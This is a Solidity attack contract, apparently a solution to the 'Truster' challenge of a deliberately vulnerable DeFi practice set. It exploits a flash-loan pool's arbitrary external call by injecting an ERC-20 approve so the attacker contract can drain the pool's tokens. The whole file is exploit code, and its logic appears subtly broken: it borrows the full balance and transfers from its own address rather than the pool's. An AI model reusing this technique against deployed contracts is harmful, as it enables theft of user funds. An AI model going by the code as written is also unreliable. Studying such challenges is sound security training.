// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

/**
 * @title TrusterAttacker
 * @author Mehdi Rhouzlane
 */
contract TrusterAttacker {
    TrusterLenderPool public immutable trusterLenderPool;
    

    constructor(address _trusterLenderPool) {
        trusterLenderPool = TrusterLenderPool(_trusterLenderPool);
    }

    function executeFlashLoan() public
    {   
        IERC20 token = trusterLenderPool.damnValuableToken(); 
        uint256 balancePool = token.balanceOf(address(trusterLenderPool)); 
        // Spender is this contract and balancePool is the amount of tokens in Pool  
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), balancePool);
        trusterLenderPool.flashLoan(balancePool, address(this), address(token), data);
        token.transferFrom(address(this), msg.sender, balancePool);
    }
}
